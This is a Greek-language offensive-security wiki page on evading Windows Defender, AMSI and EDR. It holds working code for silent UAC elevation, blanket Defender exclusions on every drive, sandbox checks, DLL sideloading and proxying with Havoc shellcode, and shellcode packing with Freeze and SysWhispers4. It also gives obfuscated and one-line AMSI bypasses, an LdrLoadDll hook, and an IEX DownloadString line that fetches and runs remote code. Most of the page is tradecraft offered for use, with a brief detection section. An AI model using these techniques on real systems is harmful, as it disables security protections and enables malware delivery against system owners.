# Παράκαμψη Antivirus (AV)

{{#include ../banners/hacktricks-training.md}}

**Αυτή η σελίδα γράφτηκε αρχικά από** [**@m2rc_p**](https://twitter.com/m2rc_p)**!**

## Διακοπή του Defender

- [defendnot](https://github.com/es3n1n/defendnot): Ένα tool για τη διακοπή της λειτουργίας του Windows Defender.
- [no-defender](https://github.com/es3n1n/no-defender): Ένα tool για τη διακοπή της λειτουργίας του Windows Defender, προσποιούμενο ότι είναι άλλο AV.
- [Απενεργοποίηση του Defender αν είστε admin](basic-powershell-for-pentesters/README.md)

### Installer-style UAC bait πριν από την παραποίηση του Defender

Οι public loaders που μεταμφιέζονται σε game cheats συχνά διανέμονται ως unsigned Node.js/Nexe installers, οι οποίοι αρχικά **ζητούν από τον χρήστη elevation** και μόνο έπειτα απενεργοποιούν τον Defender. Η ροή είναι απλή:

1. Ελέγχουν αν υπάρχει administrative context με το `net session`. Η εντολή ολοκληρώνεται με επιτυχία μόνο όταν ο caller διαθέτει δικαιώματα admin, επομένως η αποτυχία υποδεικνύει ότι ο loader εκτελείται ως standard user.
2. Κάνουν αμέσως relaunch του εαυτού τους με το verb `RunAs`, ώστε να ενεργοποιήσουν το αναμενόμενο UAC consent prompt, διατηρώντας παράλληλα την αρχική command line.
```powershell
if (-not (net session 2>$null)) {
powershell -WindowStyle Hidden -Command "Start-Process cmd.exe -Verb RunAs -WindowStyle Hidden -ArgumentList '/c ""`<path_to_loader`>""'"
exit
}
```
Τα θύματα ήδη πιστεύουν ότι εγκαθιστούν “cracked” software, επομένως συνήθως αποδέχονται το prompt, παρέχοντας στο malware τα δικαιώματα που χρειάζεται για να αλλάξει την πολιτική του Defender.<sup>[[26]](#references)</sup>

### Καθολικά `MpPreference` exclusions για κάθε γράμμα μονάδας δίσκου

Μόλις αποκτήσουν elevated privileges, οι αλυσίδες τύπου GachiLoader μεγιστοποιούν τα blind spots του Defender αντί να απενεργοποιήσουν απευθείας την υπηρεσία. Το loader αρχικά τερματίζει το GUI watchdog (`taskkill /F /IM SecHealthUI.exe`) και στη συνέχεια προσθέτει **εξαιρετικά ευρείες exclusions**, ώστε κάθε user profile, system directory και removable disk να μην μπορεί να σαρωθεί:
```powershell
$targets = @('C:\Users\', 'C:\ProgramData\', 'C:\Windows\')
Get-PSDrive -PSProvider FileSystem | ForEach-Object { $targets += $_.Root }
$targets | Sort-Object -Unique | ForEach-Object { Add-MpPreference -ExclusionPath $_ }
Add-MpPreference -ExclusionExtension '.sys'
```
Βασικές παρατηρήσεις:

- Ο βρόχος διασχίζει κάθε mounted filesystem (D:\, E:\, USB sticks κ.λπ.), επομένως **οποιοδήποτε μελλοντικό payload αποθηκευτεί οπουδήποτε στον δίσκο αγνοείται**.
- Η εξαίρεση της επέκτασης `.sys` είναι προληπτική—οι attackers διατηρούν την επιλογή να φορτώσουν unsigned drivers αργότερα, χωρίς να αγγίξουν ξανά το Defender.
- Όλες οι αλλαγές αποθηκεύονται κάτω από το `HKLM\SOFTWARE\Microsoft\Windows Defender\Exclusions`, επιτρέποντας σε μεταγενέστερα στάδια να επιβεβαιώσουν ότι οι εξαιρέσεις παραμένουν ή να τις επεκτείνουν χωρίς να ενεργοποιήσουν ξανά το UAC.

Επειδή καμία υπηρεσία του Defender δεν διακόπτεται, οι απλοϊκοί health checks συνεχίζουν να αναφέρουν «antivirus ενεργό», παρόλο που η real-time επιθεώρηση δεν αγγίζει ποτέ αυτά τα paths.<sup>[[26]](#references)</sup>

## **Μεθοδολογία AV Evasion**

Επί του παρόντος, τα AVs χρησιμοποιούν διαφορετικές μεθόδους για να ελέγξουν αν ένα file είναι malicious ή όχι: static detection, dynamic analysis και, για τα πιο advanced EDRs, behavioural analysis.

### **Static detection**

Το Static detection επιτυγχάνεται μέσω επισήμανσης γνωστών malicious strings ή arrays από bytes σε ένα binary ή script, καθώς και μέσω εξαγωγής πληροφοριών από το ίδιο το file (π.χ. file description, company name, digital signatures, icon, checksum κ.λπ.). Αυτό σημαίνει ότι η χρήση γνωστών public tools μπορεί να οδηγήσει ευκολότερα στον εντοπισμό σας, καθώς πιθανότατα έχουν ήδη αναλυθεί και επισημανθεί ως malicious. Υπάρχουν μερικοί τρόποι για να παρακάμψετε αυτόν τον τύπο detection:

- **Encryption**

Αν κάνετε encrypt το binary, δεν θα υπάρχει τρόπος για το AV να εντοπίσει το πρόγραμμά σας, αλλά θα χρειαστείτε κάποιου είδους loader για να το κάνετε decrypt και να το εκτελέσετε στη memory.

- **Obfuscation**

Μερικές φορές το μόνο που χρειάζεται είναι να αλλάξετε ορισμένα strings στο binary ή το script σας ώστε να περάσει το AV, αλλά αυτό μπορεί να είναι χρονοβόρο, ανάλογα με το τι προσπαθείτε να κάνετε obfuscate.

- **Custom tooling**

Αν αναπτύξετε τα δικά σας tools, δεν θα υπάρχουν γνωστά bad signatures, αλλά αυτό απαιτεί πολύ χρόνο και προσπάθεια.

> [!TIP]
> Ένας καλός τρόπος ελέγχου έναντι του static detection του Windows Defender είναι το [ThreatCheck](https://github.com/rasta-mouse/ThreatCheck). Ουσιαστικά χωρίζει το file σε πολλαπλά segments και στη συνέχεια ζητά από το Defender να σαρώσει το καθένα ξεχωριστά, ώστε να μπορεί να σας δείξει ακριβώς ποια strings ή bytes στο binary σας επισημαίνονται.

Συνιστώ ανεπιφύλακτα να δείτε αυτό το [YouTube playlist](https://www.youtube.com/playlist?list=PLj05gPj8rk_pkb12mDe4PgYZ5qPxhGKGf) σχετικά με το practical AV Evasion.

### **Dynamic analysis**

Το Dynamic analysis είναι όταν το AV εκτελεί το binary σας σε ένα sandbox και παρακολουθεί για malicious activity (π.χ. προσπάθεια decrypt και read των passwords του browser σας, εκτέλεση minidump στο LSASS κ.λπ.). Αυτό το μέρος μπορεί να είναι λίγο πιο δύσκολο, αλλά ακολουθούν ορισμένα πράγματα που μπορείτε να κάνετε για να αποφύγετε τα sandboxes.

- **Sleep πριν από την execution** Ανάλογα με τον τρόπο υλοποίησης, μπορεί να είναι ένας εξαιρετικός τρόπος παράκαμψης του dynamic analysis του AV. Τα AVs έχουν πολύ λίγο χρόνο για να σαρώσουν τα files, ώστε να μην διακόπτουν το workflow του χρήστη, επομένως τα μεγάλα sleeps μπορούν να διαταράξουν την ανάλυση των binaries. Το πρόβλημα είναι ότι πολλά AV sandboxes μπορούν απλώς να παρακάμψουν το sleep, ανάλογα με τον τρόπο υλοποίησής του.
- **Έλεγχος των resources του machine** Συνήθως τα Sandboxes διαθέτουν πολύ λίγους resources για να λειτουργήσουν (π.χ. < 2GB RAM), διαφορετικά θα μπορούσαν να επιβραδύνουν το machine του χρήστη. Μπορείτε επίσης να γίνετε πολύ δημιουργικοί εδώ, για παράδειγμα ελέγχοντας τη θερμοκρασία του CPU ή ακόμη και τις ταχύτητες των ανεμιστήρων· δεν θα είναι όλα υλοποιημένα στο sandbox.
- **Machine-specific checks** Αν θέλετε να στοχεύσετε έναν χρήστη του οποίου το workstation είναι joined στο domain "contoso.local", μπορείτε να κάνετε έναν έλεγχο στο domain του computer για να δείτε αν ταιριάζει με αυτό που έχετε καθορίσει· αν δεν ταιριάζει, μπορείτε να κάνετε το πρόγραμμά σας exit.

Αποδεικνύεται ότι το computername του Microsoft Defender's Sandbox είναι HAL9TH, επομένως μπορείτε να ελέγξετε το computer name στο malware σας πριν από το detonation· αν το όνομα είναι HAL9TH, σημαίνει ότι βρίσκεστε μέσα στο defender's sandbox, οπότε μπορείτε να κάνετε το πρόγραμμά σας exit.

<figure><img src="../images/image (209).png" alt=""><figcaption><p>πηγή: <a href="https://youtu.be/StSLxFbVz0M?t=1439">https://youtu.be/StSLxFbVz0M?t=1439</a></p></figcaption></figure>

Μερικά ακόμη πολύ καλά tips από τον [@mgeeky](https://twitter.com/mariuszbit) για την αντιμετώπιση των Sandboxes

<figure><img src="../images/image (248).png" alt=""><figcaption><p><a href="https://discord.com/servers/red-team-vx-community-1012733841229746240">Red Team VX Discord</a> channel #malware-dev</p></figcaption></figure>

Όπως έχουμε αναφέρει και προηγουμένως σε αυτό το post, τα **public tools** τελικά θα **εντοπιστούν**, επομένως θα πρέπει να αναρωτηθείτε το εξής:

Για παράδειγμα, αν θέλετε να κάνετε dump το LSASS, **χρειάζεστε πραγματικά να χρησιμοποιήσετε το mimikatz**; Ή θα μπορούσατε να χρησιμοποιήσετε ένα διαφορετικό project που είναι λιγότερο γνωστό και επίσης κάνει dump το LSASS;

Η σωστή απάντηση είναι πιθανότατα η δεύτερη. Παίρνοντας το mimikatz ως παράδειγμα, είναι πιθανότατα ένα από τα, αν όχι το πιο επισημασμένο malware από τα AVs και EDRs· παρόλο που το ίδιο το project είναι εξαιρετικό, είναι επίσης εφιάλτης η χρήση του για την παράκαμψη των AVs, επομένως απλώς αναζητήστε alternatives για αυτό που προσπαθείτε να επιτύχετε.

> [!TIP]
> Όταν τροποποιείτε τα payloads σας για evasion, βεβαιωθείτε ότι έχετε **απενεργοποιήσει το automatic sample submission** στο defender και, παρακαλώ, σοβαρά, **ΜΗΝ ΚΑΝΕΤΕ UPLOAD ΣΤΟ VIRUSTOTAL** αν ο στόχος σας είναι να επιτύχετε evasion μακροπρόθεσμα. Αν θέλετε να ελέγξετε αν το payload σας εντοπίζεται από ένα συγκεκριμένο AV, εγκαταστήστε το σε ένα VM, προσπαθήστε να απενεργοποιήσετε το automatic sample submission και δοκιμάστε το εκεί μέχρι να μείνετε ικανοποιημένοι με το αποτέλεσμα.

## EXEs vs DLLs

Όποτε είναι δυνατό, πάντα **δώστε προτεραιότητα στη χρήση DLLs για evasion**· από την εμπειρία μου, τα DLL files συνήθως **εντοπίζονται και αναλύονται πολύ λιγότερο**, επομένως είναι ένα πολύ απλό trick για την αποφυγή του detection σε ορισμένες περιπτώσεις (αν το payload σας μπορεί με κάποιον τρόπο να εκτελεστεί ως DLL, φυσικά).

Όπως βλέπουμε σε αυτή την εικόνα, ένα DLL Payload από το Havoc έχει detection rate 4/26 στο antiscan.me, ενώ το EXE payload έχει detection rate 7/26.

<figure><img src="../images/image (1130).png" alt=""><figcaption><p>σύγκριση στο antiscan.me ενός κανονικού Havoc EXE payload με ένα κανονικό Havoc DLL</p></figcaption></figure>

Τώρα θα παρουσιάσουμε ορισμένα tricks που μπορείτε να χρησιμοποιήσετε με DLL files, ώστε να γίνετε πολύ πιο stealthy.

## DLL Sideloading & Proxying

Το **DLL Sideloading** εκμεταλλεύεται τη σειρά αναζήτησης DLL που χρησιμοποιεί ο loader, τοποθετώντας τόσο το victim application όσο και τα malicious payload(s) το ένα δίπλα στο άλλο.

Μπορείτε να ελέγξετε για programs που είναι ευάλωτα σε DLL Sideloading χρησιμοποιώντας το [Siofra](https://github.com/Cybereason/siofra) και το ακόλουθο powershell script:
```bash
Get-ChildItem -Path "C:\Program Files\" -Filter *.exe -Recurse -File -Name| ForEach-Object {
$binarytoCheck = "C:\Program Files\" + $_
C:\Users\user\Desktop\Siofra64.exe --mode file-scan --enum-dependency --dll-hijack -f $binarytoCheck
}
```
Αυτή η εντολή θα εμφανίσει τη λίστα των προγραμμάτων που είναι ευάλωτα σε DLL hijacking μέσα στο "C:\Program Files\\" και τα αρχεία DLL που προσπαθούν να φορτώσουν.

Συνιστώ ανεπιφύλακτα να **εξερευνήσετε μόνοι σας προγράμματα DLL Hijackable/Sideloadable**. Αυτή η τεχνική είναι αρκετά stealthy όταν υλοποιείται σωστά, αλλά αν χρησιμοποιήσετε δημόσια γνωστά DLL Sideloadable προγράμματα, μπορεί να εντοπιστείτε εύκολα.

Η απλή τοποθέτηση ενός κακόβουλου DLL με το όνομα που αναμένει να φορτώσει ένα πρόγραμμα δεν θα φορτώσει το payload σας, επειδή το πρόγραμμα αναμένει να υπάρχουν συγκεκριμένες functions μέσα σε αυτό το DLL. Για να διορθώσουμε αυτό το πρόβλημα, θα χρησιμοποιήσουμε μια άλλη τεχνική που ονομάζεται **DLL Proxying/Forwarding**.

Το **DLL Proxying** προωθεί τις κλήσεις που κάνει ένα πρόγραμμα από το proxy (και κακόβουλο) DLL στο αρχικό DLL, διατηρώντας έτσι τη λειτουργικότητα του προγράμματος και επιτρέποντας την εκτέλεση του payload σας.

Θα χρησιμοποιήσω το project [SharpDLLProxy](https://github.com/Flangvik/SharpDllProxy) από τον [@flangvik](https://twitter.com/Flangvik/)

Ακολουθούν τα βήματα που ακολούθησα:
```
1. Find an application vulnerable to DLL Sideloading (siofra or using Process Hacker)
2. Generate some shellcode (I used Havoc C2)
3. (Optional) Encode your shellcode using Shikata Ga Nai (https://github.com/EgeBalci/sgn)
4. Use SharpDLLProxy to create the proxy dll (.\SharpDllProxy.exe --dll .\mimeTools.dll --payload .\demon.bin)
```
Η τελευταία εντολή θα μας δώσει 2 αρχεία: ένα πρότυπο πηγαίου κώδικα DLL και το αρχικό μετονομασμένο DLL.

<figure><img src="../images/sharpdllproxy.gif" alt=""><figcaption></figcaption></figure>
```
5. Create a new visual studio project (C++ DLL), paste the code generated by SharpDLLProxy (Under output_dllname/dllname_pragma.c) and compile. Now you should have a proxy dll which will load the shellcode you've specified and also forward any calls to the original DLL.
```
Αυτά είναι τα αποτελέσματα:

<figure><img src="../images/dll_sideloading_demo.gif" alt=""><figcaption></figcaption></figure>

Τόσο το shellcode μας (encoded με το [SGN](https://github.com/EgeBalci/sgn)) όσο και το proxy DLL έχουν Detection rate 0/26 στο [antiscan.me](https://antiscan.me)! Θα το χαρακτήριζα επιτυχία.

<figure><img src="../images/image (193).png" alt=""><figcaption></figcaption></figure>

> [!TIP]
> Σου **συνιστώ ανεπιφύλακτα** να παρακολουθήσεις το [twitch VOD του S3cur3Th1sSh1t](https://www.twitch.tv/videos/1644171543) σχετικά με το DLL Sideloading, καθώς και [το video του ippsec](https://www.youtube.com/watch?v=3eROsG_WNpE), για να μάθεις περισσότερα σχετικά με όσα συζητήσαμε, σε μεγαλύτερο βάθος.

### Κατάχρηση Forwarded Exports (ForwardSideLoading)

Τα Windows PE modules μπορούν να κάνουν export functions που στην πραγματικότητα είναι "forwarders": αντί να δείχνει σε κώδικα, η export entry περιέχει ένα ASCII string της μορφής `TargetDll.TargetFunc`. Όταν ένας caller κάνει resolve το export, ο Windows loader θα:

- Κάνει load το `TargetDll`, αν δεν έχει ήδη γίνει load
- Κάνει resolve το `TargetFunc` από αυτό

Βασικές συμπεριφορές που πρέπει να κατανοήσεις:
- Αν το `TargetDll` είναι KnownDLL, παρέχεται από το προστατευμένο namespace των KnownDLLs (π.χ. ntdll, kernelbase, ole32).<sup>[[15]](#references)</sup>
- Αν το `TargetDll` δεν είναι KnownDLL, χρησιμοποιείται η κανονική σειρά αναζήτησης DLL, η οποία περιλαμβάνει τον κατάλογο του module που εκτελεί το forward resolution.

Αυτό επιτρέπει ένα έμμεσο sideloading primitive: εντόπισε ένα signed DLL που κάνει export μια function forwarded σε ένα non-KnownDLL module name και τοποθέτησε το signed DLL μαζί με ένα attacker-controlled DLL που έχει ακριβώς το όνομα του forwarded target module. Όταν γίνει invoke το forwarded export, ο loader κάνει resolve το forward και φορτώνει το DLL σου από τον ίδιο κατάλογο, εκτελώντας το `DllMain` σου.<sup>[[13]](#references)</sup>

Παράδειγμα που παρατηρήθηκε στα Windows 11:
```
keyiso.dll KeyIsoSetAuditingInterface -> NCRYPTPROV.SetAuditingInterface
```
Το `NCRYPTPROV.dll` δεν είναι KnownDLL, επομένως εντοπίζεται μέσω της κανονικής σειράς αναζήτησης.

PoC (αντιγραφή-επικόλληση):
1) Αντιγράψτε το υπογεγραμμένο system DLL σε έναν φάκελο με δυνατότητα εγγραφής
```
copy C:\Windows\System32\keyiso.dll C:\test\
```
2) Τοποθετήστε ένα κακόβουλο `NCRYPTPROV.dll` στον ίδιο φάκελο. Ένα ελάχιστο DllMain αρκεί για την εκτέλεση κώδικα· δεν χρειάζεται να υλοποιήσετε τη forwarded function για να ενεργοποιηθεί το DllMain.
```c
// x64: x86_64-w64-mingw32-gcc -shared -o NCRYPTPROV.dll ncryptprov.c
#include <windows.h>
BOOL WINAPI DllMain(HINSTANCE hinst, DWORD reason, LPVOID reserved){
if (reason == DLL_PROCESS_ATTACH){
HANDLE h = CreateFileA("C\\\\test\\\\DLLMain_64_DLL_PROCESS_ATTACH.txt", GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
if(h!=INVALID_HANDLE_VALUE){ const char *m = "hello"; DWORD w; WriteFile(h,m,5,&w,NULL); CloseHandle(h);}
}
return TRUE;
}
```
3) Ενεργοποιήστε την προώθηση με ένα signed LOLBin:
```
rundll32.exe C:\test\keyiso.dll, KeyIsoSetAuditingInterface
```
Παρατηρούμενη συμπεριφορά:
- Το rundll32 (signed) φορτώνει το side-by-side `keyiso.dll` (signed)
- Κατά την επίλυση του `KeyIsoSetAuditingInterface`, ο loader ακολουθεί το forward προς το `NCRYPTPROV.SetAuditingInterface`
- Στη συνέχεια, ο loader φορτώνει το `NCRYPTPROV.dll` από το `C:\test` και εκτελεί το `DllMain` του
- Αν το `SetAuditingInterface` δεν έχει υλοποιηθεί, θα εμφανιστεί σφάλμα "missing API" μόνο αφού έχει ήδη εκτελεστεί το `DllMain`

Συμβουλές για hunting:
- Εστιάστε σε forwarded exports όπου το target module δεν είναι KnownDLL. Τα KnownDLLs παρατίθενται στο `HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs`.
- Μπορείτε να απαριθμήσετε τα forwarded exports με εργαλεία όπως τα εξής:
```
dumpbin /exports C:\Windows\System32\keyiso.dll
# forwarders appear with a forwarder string e.g., NCRYPTPROV.SetAuditingInterface
```
- Δείτε το Windows 11 forwarder inventory για να αναζητήσετε υποψηφίους: https://hexacorn.com/d/apis_fwd.txt<sup>[[14]](#references)</sup>

Ιδέες για detection/defense:
- Παρακολουθήστε τα LOLBins (π.χ. rundll32.exe) που φορτώνουν signed DLLs από non-system paths και, στη συνέχεια, φορτώνουν non-KnownDLLs με το ίδιο base name από αυτόν τον κατάλογο
- Δημιουργήστε alert για process/module chains όπως: `rundll32.exe` → non-system `keyiso.dll` → `NCRYPTPROV.dll` σε user-writable paths
- Επιβάλετε code integrity policies (WDAC/AppLocker) και απαγορεύστε write+execute σε application directories

## [**Freeze**](https://github.com/optiv/Freeze)

`Το Freeze είναι ένα payload toolkit για την παράκαμψη EDRs με χρήση suspended processes, direct syscalls και alternative execution methods`

Μπορείτε να χρησιμοποιήσετε το Freeze για να φορτώσετε και να εκτελέσετε το shellcode σας με stealthy τρόπο.
```
Git clone the Freeze repo and build it (git clone https://github.com/optiv/Freeze.git && cd Freeze && go build Freeze.go)
1. Generate some shellcode, in this case I used Havoc C2.
2. ./Freeze -I demon.bin -encrypt -O demon.exe
3. Profit, no alerts from defender
```
<figure><img src="../images/freeze_demo_hacktricks.gif" alt=""><figcaption></figcaption></figure>

> [!TIP]
> Το Evasion είναι απλώς ένα παιχνίδι γάτας και ποντικιού· κάτι που λειτουργεί σήμερα μπορεί να ανιχνεύεται αύριο, επομένως μην βασίζεστε ποτέ σε ένα μόνο tool· αν είναι δυνατόν, δοκιμάστε να συνδυάζετε πολλαπλές τεχνικές evasion.

## Direct/Indirect Syscalls & SSN Resolution (SysWhispers4)

Τα EDRs συχνά τοποθετούν **user-mode inline hooks** στα syscall stubs του `ntdll.dll`. Για να παρακάμψετε αυτά τα hooks, μπορείτε να δημιουργήσετε **direct** ή **indirect** syscall stubs που φορτώνουν το σωστό **SSN** (System Service Number) και πραγματοποιούν μετάβαση σε kernel mode χωρίς να εκτελούν το hooked export entrypoint.<sup>[[32]](#references)</sup>

**Επιλογές invocation:**
- **Direct (embedded)**: εισάγει μια εντολή `syscall`/`sysenter`/`SVC #0` στο generated stub (χωρίς hit σε `ntdll` export).
- **Indirect**: πραγματοποιεί jump σε ένα υπάρχον `syscall` gadget μέσα στο `ntdll`, ώστε η μετάβαση στον kernel να φαίνεται ότι προέρχεται από το `ntdll` (χρήσιμο για heuristic evasion)· το **randomized indirect** επιλέγει ένα gadget από ένα pool σε κάθε call.
- **Egg-hunt**: αποφεύγει την ενσωμάτωση της στατικής ακολουθίας opcode `0F 05` στο disk· εντοπίζει μια syscall sequence κατά το runtime.

**Hook-resistant στρατηγικές SSN resolution:**
- **FreshyCalls (VA sort)**: συμπεραίνει τα SSNs ταξινομώντας τα syscall stubs με βάση τη virtual address αντί να διαβάζει τα stub bytes.
- **SyscallsFromDisk**: κάνει map ένα καθαρό `\KnownDlls\ntdll.dll`, διαβάζει τα SSNs από το `.text` του και στη συνέχεια κάνει unmap (παρακάμπτει όλα τα in-memory hooks).
- **RecycledGate**: συνδυάζει VA-sorted SSN inference με opcode validation όταν ένα stub είναι καθαρό· πραγματοποιεί fallback σε VA inference αν είναι hooked.
- **HW Breakpoint**: θέτει το DR0 στην εντολή `syscall` και χρησιμοποιεί ένα VEH για να καταγράψει το SSN από το `EAX` κατά το runtime, χωρίς parsing hooked bytes.

Παράδειγμα χρήσης του SysWhispers4:
```bash
# Indirect syscalls + hook-resistant resolution
python syswhispers.py --preset injection --method indirect --resolve recycled

# Resolve SSNs from a clean on-disk ntdll
python syswhispers.py --preset injection --method indirect --resolve from_disk --unhook-ntdll

# Hardware breakpoint SSN extraction
python syswhispers.py --functions NtAllocateVirtualMemory,NtCreateThreadEx --resolve hw_breakpoint
```
## AMSI (Anti-Malware Scan Interface)

Το AMSI δημιουργήθηκε για την αποτροπή του "[fileless malware](https://en.wikipedia.org/wiki/Fileless_malware)". Αρχικά, τα AVs μπορούσαν να σαρώσουν μόνο **αρχεία στον δίσκο**, επομένως, αν μπορούσες με κάποιον τρόπο να εκτελέσεις payloads **απευθείας στη μνήμη**, το AV δεν μπορούσε να κάνει τίποτα για να το αποτρέψει, καθώς δεν είχε επαρκή ορατότητα.

Η λειτουργία AMSI είναι ενσωματωμένη στα παρακάτω components των Windows.

- User Account Control, ή UAC (elevation εγκατάστασης EXE, COM, MSI ή ActiveX)
- PowerShell (scripts, interactive χρήση και dynamic code evaluation)
- Windows Script Host (wscript.exe και cscript.exe)
- JavaScript και VBScript
- Office VBA macros

Επιτρέπει στις antivirus solutions να επιθεωρούν τη συμπεριφορά των scripts, εκθέτοντας τα περιεχόμενα των scripts σε μορφή που είναι τόσο unencrypted όσο και unobfuscated.

Η εκτέλεση του `IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1')` θα προκαλέσει το παρακάτω alert στο Windows Defender.

<figure><img src="../images/image (1135).png" alt=""><figcaption></figcaption></figure>

Παρατηρήστε πώς προσθέτει το `amsi:` και στη συνέχεια το path προς το executable από το οποίο εκτελέστηκε το script, σε αυτή την περίπτωση το powershell.exe

Δεν αφήσαμε κανένα αρχείο στον δίσκο, αλλά και πάλι εντοπιστήκαμε στη μνήμη λόγω του AMSI.

Επιπλέον, από το **.NET 4.8** και έπειτα, ο κώδικας C# περνά επίσης από το AMSI. Αυτό επηρεάζει ακόμη και το `Assembly.Load(byte[])` για τη φόρτωση in-memory execution. Γι' αυτό συνιστάται η χρήση παλαιότερων versions του .NET (όπως το 4.7.2 ή παλαιότερο) για in-memory execution, αν θέλετε να παρακάμψετε το AMSI.

Υπάρχουν μερικοί τρόποι για να παρακάμψετε το AMSI:

- **Obfuscation**

Καθώς το AMSI λειτουργεί κυρίως με static detections, η τροποποίηση των scripts που προσπαθείτε να φορτώσετε μπορεί να είναι ένας καλός τρόπος αποφυγής του detection.

Ωστόσο, το AMSI έχει τη δυνατότητα να κάνει unobfuscate scripts ακόμη και αν έχουν πολλαπλά layers, επομένως το obfuscation μπορεί να είναι κακή επιλογή, ανάλογα με τον τρόπο υλοποίησής του. Αυτό καθιστά την αποφυγή του όχι και τόσο straightforward. Παρόλα αυτά, μερικές φορές το μόνο που χρειάζεται να κάνετε είναι να αλλάξετε μερικά variable names και θα είστε εντάξει, οπότε αυτό εξαρτάται από το πόσο έχει γίνει flag κάτι.

- **AMSI Bypass**

Καθώς το AMSI υλοποιείται με τη φόρτωση ενός DLL στη διαδικασία του powershell (καθώς και των cscript.exe, wscript.exe κ.λπ.), είναι εύκολο να γίνει tamper με αυτό ακόμη και όταν εκτελείται ως unprivileged user. Λόγω αυτού του flaw στην υλοποίηση του AMSI, οι researchers έχουν βρει πολλούς τρόπους για να παρακάμπτουν το AMSI scanning.

**Forcing an Error**

Η αποτυχία της αρχικοποίησης του AMSI (amsiInitFailed) θα έχει ως αποτέλεσμα να μην ξεκινήσει scan για την τρέχουσα διαδικασία. Αρχικά, αυτό αποκαλύφθηκε από τον [Matt Graeber](https://twitter.com/mattifestation) και η Microsoft ανέπτυξε ένα signature για να αποτρέψει την ευρύτερη χρήση.
```bash
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
```
Αρκούσε μία γραμμή κώδικα powershell για να καταστήσει το AMSI μη χρησιμοποιήσιμο για την τρέχουσα διεργασία powershell. Αυτή η γραμμή, φυσικά, έχει επισημανθεί από το ίδιο το AMSI, επομένως απαιτείται κάποια τροποποίηση για τη χρήση αυτής της τεχνικής.

Ακολουθεί ένα τροποποιημένο AMSI bypass που πήρα από αυτό το [Github Gist](https://gist.github.com/r00t-3xp10it/a0c6a368769eec3d3255d4814802b5db).
```bash
Try{#Ams1 bypass technic nº 2
$Xdatabase = 'Utils';$Homedrive = 'si'
$ComponentDeviceId = "N`onP" + "ubl`ic" -join ''
$DiskMgr = 'Syst+@.MÂ£nÂ£g' + 'e@+nt.Auto@' + 'Â£tion.A' -join ''
$fdx = '@ms' + 'Â£InÂ£' + 'tF@Â£' + 'l+d' -Join '';Start-Sleep -Milliseconds 300
$CleanUp = $DiskMgr.Replace('@','m').Replace('Â£','a').Replace('+','e')
$Rawdata = $fdx.Replace('@','a').Replace('Â£','i').Replace('+','e')
$SDcleanup = [Ref].Assembly.GetType(('{0}m{1}{2}' -f $CleanUp,$Homedrive,$Xdatabase))
$Spotfix = $SDcleanup.GetField($Rawdata,"$ComponentDeviceId,Static")
$Spotfix.SetValue($null,$true)
}Catch{Throw $_}
```
Να έχετε υπόψη ότι αυτό πιθανότατα θα επισημανθεί μόλις δημοσιευτεί αυτή η ανάρτηση, επομένως δεν θα πρέπει να δημοσιεύσετε κώδικα αν το σχέδιό σας είναι να παραμείνετε undetected.

**Memory Patching**

Αυτή η τεχνική ανακαλύφθηκε αρχικά από τον [@RastaMouse](https://twitter.com/_RastaMouse/) και περιλαμβάνει την εύρεση της διεύθυνσης της συνάρτησης "AmsiScanBuffer" στο amsi.dll (η οποία είναι υπεύθυνη για τη σάρωση των δεδομένων εισόδου που παρέχει ο χρήστης) και την αντικατάστασή της με instructions που επιστρέφουν τον κωδικό για το E_INVALIDARG. Με αυτόν τον τρόπο, το αποτέλεσμα της πραγματικής σάρωσης θα επιστρέψει 0, το οποίο ερμηνεύεται ως καθαρό αποτέλεσμα.

> [!TIP]
> Διαβάστε το [https://rastamouse.me/memory-patching-amsi-bypass/](https://rastamouse.me/memory-patching-amsi-bypass/) για πιο λεπτομερή επεξήγηση.

Υπάρχουν επίσης πολλές άλλες τεχνικές που χρησιμοποιούνται για το bypass του AMSI με powershell. Δείτε [**αυτή τη σελίδα**](basic-powershell-for-pentesters/index.html#amsi-bypass) και [**αυτό το repo**](https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell) για να μάθετε περισσότερα σχετικά με αυτές.

### Blocking AMSI by preventing amsi.dll load (LdrLoadDll hook)

Το AMSI αρχικοποιείται μόνο αφού φορτωθεί το `amsi.dll` στην τρέχουσα process. Ένα ανθεκτικό, language‑agnostic bypass είναι η τοποθέτηση ενός user‑mode hook στο `ntdll!LdrLoadDll`, το οποίο επιστρέφει σφάλμα όταν το ζητούμενο module είναι το `amsi.dll`. Ως αποτέλεσμα, το AMSI δεν φορτώνεται ποτέ και δεν πραγματοποιούνται scans για τη συγκεκριμένη process.<sup>[[23]](#references)</sup>

Περίγραμμα υλοποίησης (x64 C/C++ pseudocode):
```c
#include <windows.h>
#include <winternl.h>

typedef NTSTATUS (NTAPI *pLdrLoadDll)(PWSTR, ULONG, PUNICODE_STRING, PHANDLE);
static pLdrLoadDll realLdrLoadDll;

NTSTATUS NTAPI Hook_LdrLoadDll(PWSTR path, ULONG flags, PUNICODE_STRING module, PHANDLE handle){
if (module && module->Buffer){
UNICODE_STRING amsi; RtlInitUnicodeString(&amsi, L"amsi.dll");
if (RtlEqualUnicodeString(module, &amsi, TRUE)){
// Pretend the DLL cannot be found → AMSI never initialises in this process
return STATUS_DLL_NOT_FOUND; // 0xC0000135
}
}
return realLdrLoadDll(path, flags, module, handle);
}

void InstallHook(){
HMODULE ntdll = GetModuleHandleW(L"ntdll.dll");
realLdrLoadDll = (pLdrLoadDll)GetProcAddress(ntdll, "LdrLoadDll");
// Apply inline trampoline or IAT patching to redirect to Hook_LdrLoadDll
// e.g., Microsoft Detours / MinHook / custom 14‑byte jmp thunk
}
```
Σημειώσεις
- Λειτουργεί σε PowerShell, WScript/CScript και custom loaders (οτιδήποτε διαφορετικά θα φόρτωνε το AMSI).
- Συνδυάστε το με την αποστολή scripts μέσω stdin (`PowerShell.exe -NoProfile -NonInteractive -Command -`) για να αποφύγετε μεγάλα command-line artefacts.
- Έχει χρησιμοποιηθεί σε loaders που εκτελούνται μέσω LOLBins (π.χ. το `regsvr32` που καλεί το `DllRegisterServer`).

Το εργαλείο **[https://github.com/Flangvik/AMSI.fail](https://github.com/Flangvik/AMSI.fail)** δημιουργεί επίσης script για την παράκαμψη του AMSI.
